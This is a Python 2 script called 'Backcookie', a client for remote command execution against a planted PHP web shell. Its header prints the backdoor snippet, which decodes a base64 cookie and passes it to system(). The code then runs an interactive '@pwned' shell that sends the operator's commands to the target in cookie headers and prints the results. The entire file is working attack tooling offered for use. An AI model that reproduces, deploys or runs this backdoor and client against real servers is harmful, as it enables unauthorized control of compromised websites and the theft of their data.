#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#       
#          Copyright 2013 - 2014 @mrjopino  <mrjopino@gmail.com>
#
# 
###############################################
import os                                     #
import sys                                    #
import urllib                                 #
import optparse                               #
import requests                               #
from sys import argv                          #
############################################################################
#                                                                          #
# Code: <?php error_reporting(0); system(base64_decode($_COOKIE["1"])); ?> ###
# It goes with a range from 1 to 0, but you can customize the parameter.     #
# Example: python -u backcookie.py http://target.com/shell.php -c name_cokie #
#                                                                          ###
# You can change the name of the cookie, in option -c.                     #
# a value of 1 for the name of your cookie, also in php.                   #
# Example: system(base64_decode($_COOKIE["yourcookie"]));                  #####
# so that the connection is successful.                                        #
#                                                                              #
# Backcookie is like the people who finds the love of his life every 2 months. #
################################################################################
#
#BackCookie
#
if "linux" in sys.platform:
	os.system("clear")
elif "win" in sys.platform:
	os.system("cls")
else:
    pass

_version_ = "1.0.3"

# class of header, encode and colors
class core:
    bc = 'Backcookie'
    ua = 'User-Agent'
    ck = 'Cookie'
    eb = 'base64'
    cl = {"blue": "\033[94m", "red": "\033[91m", "green": "\033[92m", "white": "\033[0m", "yellow": "\033[93m"}

def Error():
	print core.cl['white'] + "\t\t-------------" + core.cl['red'] + core.bc + core.cl['white'] + "------------"
	print "\t\t+             Status              +"
	print "\t\t+             sorry :(            +"
	print "\t\t-----------------------------------\n\n"
	print core.cl['blue'] + "[-] " + core.cl['red']  + "Error:" +  core.cl['yellow'] + " " + "Connection! \n" + core.cl['white']
	exit(0)

def backcookie(command, host, cookie, vcmd):
	headers = {
	           core.ua: 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1)', 
	           core.ck: cookie + '=' + command.encode(core.eb)
	          }
	try:
		r = requests.get(host, headers=headers)
		v = r.headers.values()
	except:
		Error()
	if v[0] == "0" or vcmd == "command": # vcmd > validate command
		print core.cl['blue'] + r.text.strip() + core.cl['white']
	else:
		Error()

def shell(host, cookie):
	backcookie("cd",host,cookie,"")

	print core.cl['white'] + "\t\t-------------" + core.cl['red'] + core.bc + core.cl['white'] + "------------"
	print "\t\t+    Developed by: @mrjopino      +"
	print "\t\t+             To play             +"
	print "\t\t-----------------------------------\n\n"
	print core.cl['green'] + "[+] " + core.cl['blue']  + "Happy hacking" + core.cl['white']
	print core.cl['green'] + "[+] " + core.cl['blue']  + "Sometimes it is not positive, but sometimes if!\n" + core.cl['white']

	opu = urllib.urlopen(host) # opu > openurl
	server = opu.headers.get("server")
	domain = host.split("/")[2]

	while True:

		command = raw_input("@" + "pwned:~$ ")
		if command != "binfo": #Information of conecction!
			backcookie(command,host,cookie,"command")
		else:
			print "\n"
			print core.cl['yellow'] + "[*] " + core.cl['white']  + "Information" + core.cl['white']
			print core.cl['yellow'] + "[!] " + core.cl['green']  + "Host: " + core.cl['blue'] + domain + core.cl['white']
			print core.cl['yellow'] + "[!] " + core.cl['green']  + "WebServer: " + core.cl['blue'] + server + core.cl['white']
			print core.cl['yellow'] + "[!] " + core.cl['green']  + "Target: " + core.cl['blue'] + host + core.cl['white']
			print core.cl['yellow'] + "[!] " + core.cl['green']  + "Cookie: " + core.cl['blue'] + cookie + core.cl['white']
			print "\n"

		command = raw_input("@" + "pwned:~$ ")
		if command != "exit": #exit console backcookie
			backcookie(command,host,cookie,"command")
		else:
			print "\t\t-------------" + core.cl['blue'] + "Developer" + core.cl['white'] + "------------"
			print "\t\t+        José Pino (Fraph)       +"
			print "\t\t+       Security researcher      +"
			print "\t\t+            @mrjopino           +"
			print "\t\t----------------------------------\n\n"
			print core.cl['green'] + "[!] " + core.cl['blue'] + "Version:" + " " + core.cl['yellow'] + _version_ + core.cl['white']
			print core.cl['blue'] + "[-] " + core.cl['red'] + core.bc + " OFF\n" + core.cl['white']
			break

def main():
	parser = optparse.OptionParser("python" + " " + "%prog -u <<URL>> -c <<Cookie>>", version="1.0.3")
	parser.add_option('-u', dest="Url", type="string", help="specify hostname to run on")
	parser.add_option('-c', dest="Cookie", type="string", help="specify Cookie")
	(options, args) = parser.parse_args()
	host = options.Url
	cookie = options.Cookie
	if host and cookie:
		shell(host,cookie)
	else:
		parser.print_help()
		exit(0)

if __name__ == "__main__":
        try:
        	main()
        except KeyboardInterrupt:
        	sys.exit(core.cl['blue'] + "\n\n[-] " + core.cl['green'] + "Status: " + core.cl['red'] + "close!\n" + core.cl['white']) #Ctrl + c = close
                pass
        except Exception as ke:
        	sys.exit(core.cl['red'] + "Error: " + core.cl['blue'] + "%s" % ke + core.cl['white']) #Result of error
